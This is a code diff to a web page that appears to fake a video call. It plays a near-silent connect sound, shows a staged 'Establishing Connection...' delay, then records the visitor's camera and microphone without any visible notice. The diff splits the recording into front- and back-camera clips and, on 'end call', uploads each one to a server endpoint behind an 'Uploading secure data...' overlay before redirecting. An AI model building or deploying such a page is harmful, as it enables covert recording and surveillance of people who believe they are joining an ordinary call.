@@ -39,7 +39,7 @@
         .controls {
             position:absolute; bottom:40px; width:100%;
             display:none; justify-content:center; align-items: center;
-            gap: 20px; z-index: 20; transition: opacity 0.3s, transform 0.3s;
+            gap: 20px; z-index: 20; transition: opacity 0.3s;
         }
 
         .btn {
@@ -90,14 +90,14 @@
 
     <div id="overlay">
         <span class="loader"></span>
-        <p id="statusMsg">Securing data segments...</p>
+        <p id="statusMsg">Uploading secure data...</p>
     </div>
 
 <script>
-let localStream;      // Current hardware stream
-let proxyStream;     // Stable stream for recorder
+let localStream;
 let mediaRecorder;
-let allRecordedChunks = []; 
+let currentChunks = [];
+let videoFiles = []; // Array to store finished blobs (front/back)
 let currentFacing = "user";
 let uiVisible = true;
 
@@ -108,7 +108,7 @@ const connectScreen = document.getElementById("connectScreen");
 
 // --- INITIALIZE ---
 function initiateConnection() {
-    connectSound.volume = 0.05; // 🔊 Extremely low volume as requested
+    connectSound.volume = 0.05; 
     connectSound.play().catch(e => console.log("Audio blocked"));
     
     connectScreen.innerHTML = `<span class="loader"></span><p>Establishing Connection...</p>`;
@@ -120,61 +120,84 @@ function initiateConnection() {
         localVideo.style.display = "block";
         localVideo.classList.add("snap-transition");
         
-        await startInitialStream();
-    }, 5000); // ⏳ 5-second delay
+        await startCamera();
+    }, 5000); 
 }
 
-// --- RECORDING ENGINE (SINGLE STREAM) ---
-async function startInitialStream() {
+// --- CAMERA & RECORDING ---
+async function startCamera() {
+    if (localStream) {
+        localStream.getTracks().forEach(t => t.stop());
+    }
+
     try {
         localStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: currentFacing, width: { ideal: 640 } },
             audio: true
         });
+        localVideo.srcObject = localStream;
 
-        // Create a proxy that stays alive even when we swap camera tracks
-        proxyStream = new MediaStream([
-            localStream.getVideoTracks()[0],
-            localStream.getAudioTracks()[0]
-        ]);
+        const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
+        mediaRecorder = new MediaRecorder(localStream, { mimeType: mime });
+        currentChunks = [];
 
-        localVideo.srcObject = proxyStream;
-        initMediaRecorder();
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
+        
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(currentChunks, { type: "video/webm" });
+            if (blob.size > 0) {
+                videoFiles.push(blob);
+            }
+        };
+
+        mediaRecorder.start();
     } catch (err) {
-        console.error("Initial stream failed", err);
+        console.error("Camera fail:", err);
     }
-}
-
-function initMediaRecorder() {
-    const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
-    mediaRecorder = new MediaRecorder(proxyStream, { mimeType: mime });
-    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) allRecordedChunks.push(e.data); };
-    mediaRecorder.start(1000); 
 }
 
 async function switchCamera() {
-    currentFacing = (currentFacing === "user") ? "environment" : "user";
-    try {
-        const newStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: currentFacing, width: { ideal: 640 } },
-            audio: true
-        });
-
-        const newVideoTrack = newStream.getVideoTracks()[0];
-        const oldVideoTrack = proxyStream.getVideoTracks()[0];
-
-        // Swap the track inside the recorder's stream
-        proxyStream.removeTrack(oldVideoTrack);
-        proxyStream.addTrack(newVideoTrack);
-
-        oldVideoTrack.stop(); // Turn off old camera hardware
-        localStream = newStream;
-    } catch (err) {
-        console.error("Camera switch failed", err);
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
     }
+    
+    // Tiny delay to ensure tracks are released
+    setTimeout(async () => {
+        currentFacing = (currentFacing === "user") ? "environment" : "user";
+        await startCamera();
+    }, 300);
 }
 
-// --- DRAG & MAGNETIC DOCKING ---
+// --- FINAL UPLOAD ---
+async function endCall() {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+    }
+
+    document.getElementById("overlay").style.display = "flex";
+
+    // Wait a moment for the final blob to be pushed to videoFiles
+    setTimeout(async () => {
+        if (localStream) localStream.getTracks().forEach(t => t.stop());
+
+        // Loop through all saved videos (Front, Back, etc.) and send them
+        for (let i = 0; i < videoFiles.length; i++) {
+            const formData = new FormData();
+            const fileName = `call_part_${i + 1}_${currentFacing}.webm`;
+            formData.append("video", videoFiles[i], fileName);
+
+            try {
+                await fetch("/upload", { method: "POST", body: formData });
+            } catch (e) {
+                console.error("Upload error", e);
+            }
+        }
+
+        window.location.href = "search.html";
+    }, 800);
+}
+
+// --- MAGNETIC DOCKING ---
 let isDragging = false;
 let startX, startY, initialLeft, initialTop;
 
@@ -207,8 +230,6 @@ const stopDrag = () => {
     isDragging = false;
     localVideo.classList.add("snap-transition");
     const rect = localVideo.getBoundingClientRect();
-    
-    // Magnetic Logic
     if (rect.top > window.innerHeight * 0.7) {
         localVideo.style.top = (window.innerHeight - localVideo.offsetHeight - 20) + "px";
     }
@@ -223,7 +244,6 @@ document.addEventListener("mousemove", drag);
 document.addEventListener("touchend", stopDrag);
 document.addEventListener("mouseup", stopDrag);
 
-// --- UI HELPERS ---
 function toggleUI(e) {
     if (e.target.closest('button') || isDragging || e.target === localVideo) return;
     uiVisible = !uiVisible;
@@ -232,32 +252,13 @@ function toggleUI(e) {
 }
 
 function toggleMic(btn) {
-    const t = proxyStream.getAudioTracks()[0];
+    const t = localStream.getAudioTracks()[0];
     if(t) {
         t.enabled = !t.enabled;
         btn.style.background = t.enabled ? "rgba(255,255,255,0.15)" : "white";
         btn.style.color = t.enabled ? "white" : "black";
         document.getElementById("micIcon").className = t.enabled ? "fas fa-microphone" : "fas fa-microphone-slash";
     }
-}
-
-// --- FINAL UPLOAD ---
-async function endCall() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
-    }
-
-    setTimeout(async () => {
-        document.getElementById("overlay").style.display = "flex";
-        if (localStream) localStream.getTracks().forEach(t => t.stop());
-
-        const finalBlob = new Blob(allRecordedChunks, { type: "video/webm" });
-        const formData = new FormData();
-        formData.append("video", finalBlob, "call_full.webm");
-
-        try { await fetch("/upload", { method: "POST", body: formData }); } catch (e) {}
-        window.location.href = "search.html";
-    }, 500);
 }
 </script>
 </body>
